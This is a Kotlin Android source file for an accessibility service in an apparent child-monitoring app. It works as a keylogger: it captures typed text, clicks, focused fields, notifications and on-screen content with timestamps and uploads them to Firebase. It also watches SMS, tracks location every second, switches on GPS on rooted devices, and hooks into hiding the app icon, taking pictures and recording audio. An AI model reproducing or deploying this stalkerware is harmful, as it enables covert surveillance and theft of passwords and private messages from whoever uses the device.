package com.github.midros.istheapp.services.accessibilityData

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Handler
import android.provider.Telephony
import android.util.Log
import androidx.core.app.ActivityCompat
import android.view.accessibility.AccessibilityEvent
import com.github.midros.istheapp.app.IsTheApp
import com.github.midros.istheapp.data.model.ChildRecording
import com.github.midros.istheapp.data.rxFirebase.InterfaceFirebase
import com.github.midros.istheapp.services.sms.SmsObserver
import com.github.midros.istheapp.utils.ConstFun.enableGpsRoot
import com.github.midros.istheapp.utils.ConstFun.getDateTime
import com.github.midros.istheapp.utils.ConstFun.isRoot
import com.github.midros.istheapp.utils.Consts.PARAMS
import com.github.midros.istheapp.utils.Consts.RECORDING
import com.github.midros.istheapp.utils.Consts.TAG
import com.google.firebase.database.DatabaseReference
import com.pawegio.kandroid.i
import com.pawegio.kandroid.runDelayedOnUiThread
import javax.inject.Inject

/**
 * Created by luis rafael on 17/03/18.
 */
class AccessibilityDataService : AccessibilityService(), LocationListener {

    companion object {
        var isRunningService: Boolean = false
    }
    @Inject
    lateinit var interactor: InteractorAccessibilityData
    @Inject
    lateinit var firebase: InterfaceFirebase
    private lateinit var locationManager: LocationManager

    override fun onCreate() {
        super.onCreate()
        IsTheApp.appComponent.inject(this)
        getLocation()
        interactor.getShowOrHideApp()
        interactor.getCapturePicture()
        interactor.getRecordingAudio()
        registerSmsObserver()
    }

    private fun registerSmsObserver() =
        contentResolver.registerContentObserver(
            Telephony.Sms.CONTENT_URI,
            true,
            SmsObserver(this, Handler())
        )

    override fun onInterrupt() {}
    private fun getReference(child: String):
            DatabaseReference = firebase.getDatabaseReference(child)
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.text.size > 0) {
            val text = event.text.toString();
            var packageName =""
            if (event.packageName != null)
                  packageName = event.packageName.toString();
            Log.i("keylog", packageName + "-" + text)
            if (text.contains("Grabando") || text.contains("[Pausar]")
                || text.contains("[Llamada]") || text.contains("[CONTESTAR]"))
            {//                interactor.getRecordingAudio()
            //    startRecording(child.timeAudio!!)
            //    val childRecording = ChildRecording(true,60000)
             //   getReference("$RECORDING/$PARAMS").setValue(childRecording)

            }
         //   interactor.getCapturePicture()
        }
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(TEXT)| $data")
                    i(TAG, "${getDateTime()} |(TEXT)| $data")
                }
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(FOCUSED)| $data")
                    i(TAG, "${getDateTime()} |(FOCUSED)| $data")
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                var data = event.text.toString()
                if (data != "[]") {
                    data = packageName + ": " + data;
                    interactor.setDataKey("${getDateTime()} |(CLICKED)| $data")
                    i(TAG, "${getDateTime()} |(CLICKED)| $data")
                } else {
                    val data = event.contentDescription.toString()
                }
            }
            AccessibilityEvent.TYPE_VIEW_LONG_CLICKED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(LONG CLICKED)| $data")
                    i(TAG, "${getDateTime()} |(LONG CLICKED)| $data")
                }
            }
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(NOTIFICACION)| $data")
                    i(TAG, "${getDateTime()} |(NOTIFICACION)| $data")
                }
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(CONTENT_CHANGED)| $data")
                    i(TAG, "${getDateTime()} |(CONTENT_CHANGED)| $data")
                }
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(STATE_CHANGED)| $data")
                    i(TAG, "${getDateTime()} |(STATE_CHANGED)| $data")
                }
            }
            AccessibilityEvent.TYPE_VIEW_SELECTED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(VIEW_SELECTED)| $data")
                    i(TAG, "${getDateTime()} |(VIEW_SELECTED)| $data")
                }
            }
        }

    }

    override fun onServiceConnected() {
        isRunningService = true
        interactor.setRunServiceData(true)
        interactor.getSocialStatus()
        interactor.startCountDownTimer()
        super.onServiceConnected()
    }

    override fun onDestroy() {
        isRunningService = false
        interactor.stopCountDownTimer()
        interactor.setRunServiceData(false)
        interactor.clearDisposable()
        super.onDestroy()
    }


    //location
    private fun getLocation() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        if (ActivityCompat.checkSelfPermission( this, Manifest.permission.ACCESS_FINE_LOCATION ) == PackageManager.PERMISSION_GRANTED ) {
            interactor.enablePermissionLocation(true)
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 0f, this)
        } else
            interactor.enablePermissionLocation(false)
    }

    override fun onLocationChanged(location: Location) = interactor.setDataLocation(location)

    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}

    override fun onProviderEnabled(provider: String?) {
        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER))
            interactor.enableGps(true )
    }

    override fun onProviderDisabled(provider: String?) {
        if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER))
            interactor.enableGps(false  )
        runDelayedOnUiThread(3000) { if (isRoot()) enableGpsRoot() }
    }

}